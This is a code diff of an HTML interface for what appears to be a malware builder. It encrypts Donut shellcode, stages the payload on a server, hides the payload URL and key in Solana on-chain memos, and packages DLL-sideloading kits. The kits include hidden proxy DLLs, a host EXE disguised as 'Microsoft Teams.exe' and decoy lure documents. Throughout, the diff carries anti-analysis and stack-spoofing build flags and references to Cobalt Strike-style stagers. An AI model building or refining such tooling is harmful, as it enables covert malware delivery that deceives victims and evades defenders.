@@ -40,8 +40,7 @@
     <div class="build-main">
       <nav class="tabs">
         <button class="tab active" data-tab="encrypt">1 · Encrypt</button>
-        <button class="tab" data-tab="sideload">2 · Sideload</button>
-        <button class="tab" data-tab="build">3 · Build</button>
+        <button class="tab" data-tab="build">2 · Build</button>
       </nav>
 
       <div class="build-stage">
@@ -50,10 +49,9 @@
         <section class="panel active" id="panel-encrypt">
           <div class="panel-head">
             <h2>Encrypt shellcode</h2>
-            <p>Runs <code>Encrypt.py</code>. Produces an encrypted <code>.dat</code> payload and a
-            <strong>memo string</strong> you post on-chain as the <em>first transaction</em> from your beacon
-            wallet. The binary only embeds the wallet address — URL, key, nonce, size, and compression flag
-            all live on-chain.</p>
+            <p>Runs <code>Encrypt.py</code>. Produces <code>data.enc</code> (upload to your staging server)
+            and a <strong>decrypt key</strong> you combine with your staging URL at publish time.
+            The binary only embeds the wallet address — URL and key live on-chain.</p>
           </div>
           <form id="form-encrypt" class="form">
 
@@ -64,39 +62,33 @@
                 <label class="src-opt"><input type="radio" name="sc_src" value="workspace" checked> From Donut workspace</label>
                 <label class="src-opt"><input type="radio" name="sc_src" value="upload"> Upload file</label>
               </div>
-              <select id="enc-sc-job" name="shellcode_job_id" class="select-field">
-                <option value="">— no successful Donut jobs yet —</option>
-              </select>
+              <div class="cdd" id="enc-sc-job-wrap">
+                <button type="button" class="cdd-trigger">
+                  <span class="cdd-display">— no successful Donut jobs yet —</span>
+                  <span class="cdd-arrow">▾</span>
+                </button>
+                <div class="cdd-list hidden"></div>
+              </div>
+              <input type="hidden" id="enc-sc-job" value="">
               <input type="file" id="enc-sc-file" name="shellcode" class="hidden-src">
             </div>
 
             <!-- Wallet selector -->
             <div class="field">
               <span>Beacon wallet</span>
-              <select id="enc-wallet-sel" class="select-field">
-                <option value="">— select from Solana workspace —</option>
-              </select>
+              <div class="cdd" id="enc-wallet-sel-wrap">
+                <button type="button" class="cdd-trigger">
+                  <span class="cdd-display">— select from Solana workspace —</span>
+                  <span class="cdd-arrow">▾</span>
+                </button>
+                <div class="cdd-list hidden"></div>
+              </div>
+              <input type="hidden" id="enc-wallet-sel" value="">
               <input type="text" name="sol_wallet" id="enc-wallet"
                      placeholder="Or paste base58 address manually (32–44 chars)"
                      pattern="[1-9A-HJ-NP-Za-km-z]{32,44}"
                      autocomplete="off" spellcheck="false">
             </div>
-
-            <!-- Staging URL -->
-            <label class="field">
-              <span>Staging URL <em>— HTTPS location where you'll host the encrypted <code>.dat</code> file</em></span>
-              <input type="url" name="url" id="enc-url"
-                     placeholder="https://c2.example.com/payload.dat" required>
-              <span style="font-size:11px;color:var(--text-mute);margin-top:2px">
-                The loader downloads this file at runtime. The URL is compiled into the binary
-                (XOR-encoded) and also stored in the on-chain memo.
-              </span>
-            </label>
-
-            <label class="field">
-              <span>RPC endpoint <em>(optional — default: mainnet-beta)</em></span>
-              <input type="url" name="rpc_url" id="enc-rpc" placeholder="https://api.devnet.solana.com">
-            </label>
 
             <div class="actions">
               <button type="submit" class="primary">Encrypt</button>
@@ -105,23 +97,6 @@
           </form>
 
           <pre class="console" id="out-encrypt"></pre>
-
-          <!-- Memo box -->
-          <div class="memo-wrap hidden" id="memo-wrap">
-            <div class="memo-header">
-              <span class="memo-label">📋 On-chain memo — post as the first tx from your beacon wallet</span>
-              <div class="memo-header-btns">
-                <button class="copy-btn" id="btn-copy-memo">Copy</button>
-                <button class="copy-btn" id="btn-dl-memo" title="Save memo.txt to disk">↓ Save</button>
-              </div>
-            </div>
-            <pre class="memo-box" id="memo-box"></pre>
-            <p class="memo-hint">
-              Format: <code>&lt;url&gt;|&lt;key&gt;|&lt;nonce&gt;|&lt;size&gt;|&lt;compressed&gt;</code>
-              — send via any Solana wallet as an
-              <a href="https://spl.solana.com/memo" target="_blank" rel="noopener">SPL Memo</a> instruction.
-            </p>
-          </div>
 
 
           <details class="preview-wrap">
@@ -142,80 +117,6 @@
 
         </section>
 
-        <!-- ── Sideload config panel ──────────────────────────── -->
-        <section class="panel" id="panel-sideload">
-          <div class="panel-head">
-            <h2>Sideload config</h2>
-            <p>Select the target DLL and host EXE from the <strong>Sideload workspace</strong>.
-               <code>SideloadGen.py</code> runs automatically when you click Build.
-               The output is a ZIP ready to deploy.</p>
-          </div>
-          <div class="form">
-
-            <!-- Target DLL -->
-            <div class="field">
-              <span>Target DLL <em>(required — from Sideload workspace)</em></span>
-              <select id="sl-dll-sel" class="select-field">
-                <option value="">— no DLLs in workspace yet —</option>
-              </select>
-            </div>
-
-            <!-- Host EXE -->
-            <div class="field">
-              <span>Host EXE <em>(required — from Sideload workspace)</em></span>
-              <select id="sl-exe-sel" class="select-field">
-                <option value="">— no EXEs in workspace yet —</option>
-              </select>
-            </div>
-
-            <!-- Rename options -->
-            <div class="row">
-              <label class="field">
-                <span>Original DLL rename <em>(optional)</em></span>
-                <input type="text" id="sl-dll-rename" placeholder="target_orig.dll"
-                       autocomplete="off" spellcheck="false">
-                <span style="font-size:11px;color:var(--text-mute)">Forwarding target inside Sideload.h. Defaults to <code>target_orig.dll</code>.</span>
-              </label>
-              <label class="field">
-                <span>Host EXE rename in ZIP <em>(optional)</em></span>
-                <input type="text" id="sl-host-rename" placeholder="e.g. Microsoft Teams.exe"
-                       autocomplete="off" spellcheck="false">
-                <span style="font-size:11px;color:var(--text-mute)">Filename given to the host EXE inside the output ZIP.</span>
-              </label>
-            </div>
-
-            <!-- Bind file (optional) -->
-            <div class="field">
-              <span>Bind file <em>(optional — lure document opened before shellcode runs)</em></span>
-              <select id="sl-bind-sel" class="select-field">
-                <option value="">— none —</option>
-              </select>
-              <span style="font-size:11px;color:var(--text-mute)">
-                Placed in a hidden <code>_\</code> folder next to the loader. Opened via
-                <code>ShellExecuteA("open")</code> to display a decoy document.
-              </span>
-            </div>
-
-            <!-- Bind file rename -->
-            <label class="field">
-              <span>Bind file name in ZIP <em>(optional — defaults to uploaded filename)</em></span>
-              <input type="text" id="sl-bind-rename" placeholder="e.g. Quarterly Report Q1 2025.pdf"
-                     autocomplete="off" spellcheck="false">
-            </label>
-
-            <!-- ZIP output name -->
-            <label class="field">
-              <span>ZIP output name <em>(required)</em></span>
-              <input type="text" id="sl-zip-name" placeholder="deploy.zip"
-                     autocomplete="off" spellcheck="false" required>
-              <span style="font-size:11px;color:var(--text-mute)">
-                ZIP will contain: <strong>proxy DLL</strong> (hidden) · <strong>original DLL</strong> (hidden, renamed) · <strong>host EXE</strong> · <em>_\bind file</em> (if set).
-              </span>
-            </label>
-
-          </div>
-        </section>
-
         <!-- ── Build panel ────────────────────────────────────── -->
         <section class="panel" id="panel-build">
           <div class="panel-head">
@@ -233,12 +134,60 @@
                 <span>DLL sideload</span>
               </label>
             </div>
-            <!-- sideload summary — shown only in sideload mode -->
-            <div id="field-sideload-summary" class="field sideload-summary hidden">
-              <span>Sideload config</span>
-              <div id="bld-sl-summary" class="sl-summary-box">
-                No DLL / EXE selected — configure in the <strong>Sideload</strong> tab.
+
+            <!-- sideload config — shown only in sideload mode -->
+            <div id="field-sideload-config" class="hidden">
+
+              <div class="field">
+                <span>Target DLL <em>(from Sideload workspace)</em></span>
+                <select id="sl-dll-sel" class="select-field">
+                  <option value="">— no DLLs in workspace yet —</option>
+                </select>
               </div>
+
+              <div class="field">
+                <span>Host EXE <em>(from Sideload workspace)</em></span>
+                <select id="sl-exe-sel" class="select-field">
+                  <option value="">— no EXEs in workspace yet —</option>
+                </select>
+              </div>
+
+              <div class="row">
+                <label class="field">
+                  <span>Original DLL rename <em>(optional)</em></span>
+                  <input type="text" id="sl-dll-rename" placeholder="target_orig.dll"
+                         autocomplete="off" spellcheck="false">
+                  <span style="font-size:11px;color:var(--text-mute)">Forwarding target inside Sideload.h. Defaults to <code>target_orig.dll</code>.</span>
+                </label>
+                <label class="field">
+                  <span>Host EXE rename in ZIP <em>(optional)</em></span>
+                  <input type="text" id="sl-host-rename" placeholder="e.g. Microsoft Teams.exe"
+                         autocomplete="off" spellcheck="false">
+                </label>
+              </div>
+
+              <div class="field">
+                <span>Bind file <em>(optional — lure document)</em></span>
+                <select id="sl-bind-sel" class="select-field">
+                  <option value="">— none —</option>
+                </select>
+              </div>
+
+              <label class="field">
+                <span>Bind file name in ZIP <em>(optional)</em></span>
+                <input type="text" id="sl-bind-rename" placeholder="e.g. Quarterly Report Q1 2025.pdf"
+                       autocomplete="off" spellcheck="false">
+              </label>
+
+              <label class="field">
+                <span>ZIP output name <em>(required)</em></span>
+                <input type="text" id="sl-zip-name" placeholder="deploy.zip"
+                       autocomplete="off" spellcheck="false" required>
+                <span style="font-size:11px;color:var(--text-mute)">
+                  ZIP: <strong>proxy DLL</strong> (hidden) · <strong>original DLL</strong> (hidden) · <strong>host EXE</strong> · <em>_\bind file</em> (if set).
+                </span>
+              </label>
+
             </div>
             <fieldset class="field">
               <legend>Compile-time flags</legend>
@@ -247,6 +196,19 @@
               <label class="check"><input type="checkbox" name="debug" id="bld-debug">   <span>DEBUG — logs to <code>debug.log</code>, skips anti-analysis</span></label>
               <label class="check"><input type="checkbox" name="synthetic" id="bld-syn"> <span>ENABLE_SYNTHETIC_STACK — Draugr RSP swap (opt-in)</span></label>
             </fieldset>
+            <!-- Payload.h source -->
+            <div class="field">
+              <span>Payload.h <em>— select from encrypt history</em></span>
+              <div class="cdd" id="bld-payload-sel-wrap">
+                <button type="button" class="cdd-trigger">
+                  <span class="cdd-display">— use existing Payload.h in project root —</span>
+                  <span class="cdd-arrow">▾</span>
+                </button>
+                <div class="cdd-list hidden"></div>
+              </div>
+              <input type="hidden" id="bld-payload-sel" value="">
+            </div>
+
             <div class="actions">
               <button type="submit" class="primary">Build</button>
               <button type="button" id="btn-refresh-arts">Refresh artifacts</button>
@@ -273,20 +235,36 @@
     <!-- sidebar -->
     <aside class="build-sidebar">
 
-      <!-- profiles -->
+      <!-- encrypt profiles -->
       <div class="sb-section">
         <div class="sb-head">
-          <h3>Profiles</h3>
-          <button class="btn-sm" id="btn-show-save-profile">Save current</button>
+          <h3>Encrypt Profiles</h3>
+          <button class="btn-sm" id="btn-show-save-enc-profile">Save</button>
         </div>
-        <div id="profile-save-row" class="save-row hidden">
-          <input type="text" id="profile-name-input" placeholder="Profile name…" class="save-input">
-          <button class="btn-sm primary" id="btn-confirm-save-profile">Save</button>
-          <button class="btn-sm" id="btn-cancel-save-profile">✕</button>
-          <a id="btn-saveas-new" class="save-as-link hidden" href="#">save as new</a>
+        <div id="enc-profile-save-row" class="save-row hidden">
+          <input type="text" id="enc-profile-name-input" placeholder="Profile name…" class="save-input">
+          <button class="btn-sm primary" id="btn-confirm-save-enc-profile">Save</button>
+          <button class="btn-sm" id="btn-cancel-save-enc-profile">✕</button>
+          <a id="btn-enc-saveas-new" class="save-as-link hidden" href="#">save as new</a>
         </div>
-        <ul id="profile-list" class="mgmt-items"></ul>
-        <p class="empty-note hidden" id="profile-empty">No profiles saved.</p>
+        <ul id="enc-profile-list" class="mgmt-items"></ul>
+        <p class="empty-note hidden" id="enc-profile-empty">No encrypt profiles.</p>
+      </div>
+
+      <!-- build profiles -->
+      <div class="sb-section" style="margin-top:16px">
+        <div class="sb-head">
+          <h3>Build Profiles</h3>
+          <button class="btn-sm" id="btn-show-save-bld-profile">Save</button>
+        </div>
+        <div id="bld-profile-save-row" class="save-row hidden">
+          <input type="text" id="bld-profile-name-input" placeholder="Profile name…" class="save-input">
+          <button class="btn-sm primary" id="btn-confirm-save-bld-profile">Save</button>
+          <button class="btn-sm" id="btn-cancel-save-bld-profile">✕</button>
+          <a id="btn-bld-saveas-new" class="save-as-link hidden" href="#">save as new</a>
+        </div>
+        <ul id="bld-profile-list" class="mgmt-items"></ul>
+        <p class="empty-note hidden" id="bld-profile-empty">No build profiles.</p>
       </div>
 
       <!-- artifacts -->
@@ -379,6 +357,10 @@
           <input type="file" name="exe" accept=".exe,.dll" required>
         </label>
         <label class="field">
+          <span>Label <span style="font-weight:400;color:var(--text-mute)">(shown in shellcode selector)</span></span>
+          <input type="text" name="label" placeholder="e.g. Cobalt Stage x64 v2" maxlength="64">
+        </label>
+        <label class="field">
           <span>Architecture</span>
           <select name="arch" class="select-field">
             <option value="2" selected>x64 (default)</option>
@@ -450,12 +432,6 @@
           <button class="btn-sm primary" id="btn-confirm-rename">Save</button>
           <button class="btn-sm" id="btn-cancel-rename">✕</button>
         </div>
-
-        <!-- shared RPC -->
-        <label class="field" style="margin-bottom:16px;max-width:480px">
-          <span>RPC endpoint <em>(optional — connects to mainnet-beta if blank)</em></span>
-          <input type="url" id="wp-rpc" placeholder="https://api.devnet.solana.com">
-        </label>
 
         <div class="wallet-actions-grid">
 
